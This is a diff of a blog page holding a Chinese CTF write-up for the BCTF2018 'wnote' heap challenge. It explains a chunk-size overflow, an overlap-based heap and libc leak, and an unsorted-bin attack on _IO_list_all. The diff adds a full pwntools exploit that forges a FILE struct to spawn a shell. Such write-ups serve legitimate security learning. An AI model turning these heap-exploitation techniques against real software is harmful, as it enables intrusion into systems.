@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="BCTF2018-WNOTE题目 文件 12345678910root@261f8c67866c:/pwn/wnote# file wnotewnote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for G">
+<meta name="description" content="题目 文件 12345678910root@261f8c67866c:/pwn/wnote# file wnotewnote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0">
 <meta name="keywords" content="pwn | ctf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BCTF2018-wnote">
 <meta property="og:url" content="http://yoursite.com/2018/07/19/BCTF2018-wnote/index.html">
 <meta property="og:site_name" content="greyd0g&#39; blog">
-<meta property="og:description" content="BCTF2018-WNOTE题目 文件 12345678910root@261f8c67866c:/pwn/wnote# file wnotewnote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for G">
+<meta property="og:description" content="题目 文件 12345678910root@261f8c67866c:/pwn/wnote# file wnotewnote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-07-18T21:37:03.797Z">
+<meta property="og:updated_time" content="2018-07-18T22:59:50.920Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BCTF2018-wnote">
-<meta name="twitter:description" content="BCTF2018-WNOTE题目 文件 12345678910root@261f8c67866c:/pwn/wnote# file wnotewnote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for G">
+<meta name="twitter:description" content="题目 文件 12345678910root@261f8c67866c:/pwn/wnote# file wnotewnote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0">
 
 
 
@@ -325,7 +325,7 @@
       
 
       
-        <h2 id="BCTF2018-WNOTE"><a href="#BCTF2018-WNOTE" class="headerlink" title="BCTF2018-WNOTE"></a>BCTF2018-WNOTE</h2><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a><code>题目</code></h2><ul>
+        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a><code>题目</code></h2><ul>
 <li><p>文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@261f8c67866c:/pwn/wnote# file wnote</span><br><span class="line">wnote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=684d0cb0365cd02a87cff0614e93e462659047d0, not stripped</span><br><span class="line">64位elf文件动态链接</span><br><span class="line">root@261f8c67866c:/pwn/wnote# checksec wnote</span><br><span class="line">[*] &apos;/pwn/wnote/wnote&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
 </li>
@@ -338,15 +338,44 @@
 </ul>
 <h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if ( size &gt; 0x20 )</span><br><span class="line">&#123;</span><br><span class="line">  v27 = 0x40LL;</span><br><span class="line">  if ( (size - 0x21LL) &gt; 0x1E )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (size - 0x41LL) &lt;= 0x3E )</span><br><span class="line">      v27 = 0x80LL;</span><br><span class="line">    else</span><br><span class="line">      v27 = (size + 15) &amp; 0xF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>可以分配的堆快大小受到限制，只能得到0x20 0x50 0x80 大小的堆块。</p>
-<p>| 0x00-0x20                             |    input_size 0x20    |<br>| ————————————- | :——————-: |<br>| 0x21-0x3f                             |         0x40          |<br>| 0x40                                  | (input_size +0xf)&amp;0xf |<br>| 0x41-0x7f                             |         0x80          |<br>| 0x80-0x400                            | (input_size+0xf)&amp;0xf  |<br>| 输入size为0x40 或大于0x7f时会产生溢出 |                       |</p>
-</li>
+<li>可以分配的堆快大小受到限制，只能得到0x20 0x50 0x80 大小的堆块。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>0x00-0x20</th>
+<th style="text-align:center">input_size 0x20</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x21-0x3f</td>
+<td style="text-align:center">0x40</td>
+</tr>
+<tr>
+<td>0x40</td>
+<td style="text-align:center">(input_size +0xf)&amp;0xf</td>
+</tr>
+<tr>
+<td>0x41-0x7f</td>
+<td style="text-align:center">0x80</td>
+</tr>
+<tr>
+<td>0x80-0x400</td>
+<td style="text-align:center">(input_size+0xf)&amp;0xf</td>
+</tr>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>输入size为0x40 或大于0x7f时会产生溢出</li>
 </ul>
 <ul>
 <li><p>漏洞利用</p>
 <ul>
-<li><p>info leak</p>
-<ul>
+<li>info leak<ul>
 <li>FD leak addr<ul>
 <li>通过溢出修改size造成overlap</li>
 <li>将数组中两个ptr指向同一个堆</li>
@@ -356,16 +385,16 @@
 </li>
 </ul>
 </li>
-<li><p>hijack rip</p>
-<ul>
+<li>hijack rip<ul>
 <li>unsortbin attack io_list_all</li>
 <li>通过溢出伪造堆块大小为0x60(fake file struct)，free</li>
 <li>再次malloc，触发_IO_flush_all_lockp getshell</li>
 </ul>
 </li>
 </ul>
-</li>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2></li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./wnote&apos;)</span><br><span class="line"></span><br><span class="line">def add_note(len,conte):</span><br><span class="line">    p.sendlineafter(&quot;==     Enter a number to start...       ==&quot;,&apos;1&apos;)</span><br><span class="line">    p.sendlineafter(&quot;note length:&quot;,str(len))</span><br><span class="line">    p.sendlineafter(&quot;content:&quot;,conte)</span><br><span class="line">def edit_note(idx,len,conte):</span><br><span class="line">    p.sendlineafter(&quot;==     Enter a number to start...       ==&quot;,&apos;2&apos;)</span><br><span class="line">    p.sendlineafter(&apos; edit:&apos;,str(idx))</span><br><span class="line">    p.sendlineafter(&quot;length:&quot;,str(len))</span><br><span class="line">    p.sendlineafter(&quot;content:&quot;,conte)</span><br><span class="line">def dele(idx):</span><br><span class="line">    p.sendlineafter(&quot;==     Enter a number to start...       ==&quot;,&apos;3&apos;)</span><br><span class="line">    p.sendlineafter(&quot;delete:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line">def leak(idx):</span><br><span class="line">    p.sendlineafter(&quot;==     Enter a number to start...       ==&quot;,&apos;6&apos;)</span><br><span class="line">    p.sendlineafter(&quot;want to list:&quot;,str(idx))</span><br><span class="line">    p.recvuntil(repr(idx)+&apos;: &apos;)</span><br><span class="line">    data = p.recvuntil(&apos;\n&apos;)[:-1]</span><br><span class="line">    return data </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hint():</span><br><span class="line">    print pidof(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    add_note(0x40,&apos;A&apos;*20)#0</span><br><span class="line">    add_note(0x7f,&apos;C&apos;*20)#1</span><br><span class="line">    add_note(0x40,&apos;B&apos;*20)#2</span><br><span class="line">    add_note(0x40,&apos;B&apos;*20)#3</span><br><span class="line">    add_note(0x40,&apos;D&apos;*20)#4</span><br><span class="line">    add_note(0x21,&apos;D&apos;*20)#5</span><br><span class="line">    edit_note(0,0x40,&apos;A&apos;*0x18+&apos;\x41&apos;+&apos;\x01&apos;)</span><br><span class="line">    dele(1)</span><br><span class="line">    add_note(0x7f,&apos;111&apos;)#1</span><br><span class="line">    add_note(0x40,&apos;2222&apos;)#6</span><br><span class="line">    add_note(0x40,&apos;3333&apos;)#7</span><br><span class="line">    add_note(0x50,&apos;44444&apos;)#8</span><br><span class="line">    dele(6)</span><br><span class="line">    dele(7)</span><br><span class="line">    data = leak(3)</span><br><span class="line">    print data</span><br><span class="line">    heap = u64(data.ljust(8,&apos;\x00&apos;))</span><br><span class="line">    print &quot;[*] heap addr is &quot; + hex(heap)</span><br><span class="line">    aim  = heap - 0x218</span><br><span class="line">    edit_note(2,0x40,&apos;A&apos;*0x18 + &apos;\x21&apos; + &apos;\x22&apos; + &apos;\x00&apos;*6 + p64(aim))</span><br><span class="line">    add_note(0x40,&apos;1111&apos;)#6</span><br><span class="line">    leak_libc = heap  - 0x80</span><br><span class="line">    add_note(0x40,&apos;a&apos;+&apos;\x00&apos;*7+p64(leak_libc) + &apos;\x31\x41&apos;)#7</span><br><span class="line">    dele(1)</span><br><span class="line">    libc = u64(leak(6).ljust(8,&apos;\x00&apos;)) - 0x3c4b78</span><br><span class="line">    print &quot;[*] libc is &quot; + hex(libc)</span><br><span class="line">    hook = libc + 0x3c4b10</span><br><span class="line">    one = libc + 0x4526a</span><br><span class="line">    io_list = libc +0x3c5520</span><br><span class="line">    system = libc + 0x45390</span><br><span class="line">    bin0 = libc +0x3c4b78</span><br><span class="line">    add_note(0x7f,&apos;1111&apos;)#1</span><br><span class="line">    add_note(0x40,&apos;1111&apos;)#</span><br><span class="line">    add_note(0x7f,&apos;1111&apos;)#</span><br><span class="line">    add_note(0x40,&apos;1111&apos;)#</span><br><span class="line">    dele(1)</span><br><span class="line">    edit_note(0,0x100, &apos;A&apos;*0x18+ &apos;\x61\x11&apos;+&apos;\x00&apos;*6 + p64(bin0) + p64(bin0) )</span><br><span class="line">    add_note(0x7f,&apos;1111&apos;)#1</span><br><span class="line">    dele(10)</span><br><span class="line">    edit_note(9,0x40, &apos;A&apos;*0x18+ &apos;\x91\x11&apos;+&apos;\x00&apos;*6 + p64(bin0) + p64(io_list-0x10))</span><br><span class="line">    vtable = heap-0x90+0xd0</span><br><span class="line">    fake = &apos;/bin/sh\x00&apos;</span><br><span class="line">    fake += p64(0)*4</span><br><span class="line">    fake += p64(1)+p64(0)*21 + p64(vtable)+p64(system)*2</span><br><span class="line">    edit_note(0,0x100,&apos;A&apos;+&apos;n&apos;+&apos;\x00&apos;*14 + fake)</span><br><span class="line">    add_note(0x7f,&apos;aaa&apos;)</span><br><span class="line">	 p.sendlineafter(&quot;==     Enter a number to start...       ==&quot;,&apos;1&apos;)</span><br><span class="line">    p.sendlineafter(&quot;note length:&quot;,str(0x7f))</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -502,7 +531,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">1</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
@@ -577,7 +606,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BCTF2018-WNOTE"><span class="nav-number">1.</span> <span class="nav-text">BCTF2018-WNOTE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">2.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞"><span class="nav-number">3.</span> <span class="nav-text">漏洞</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞"><span class="nav-number">2.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">3.</span> <span class="nav-text">exp</span></a></li></ol></div>
             
 
           </div>
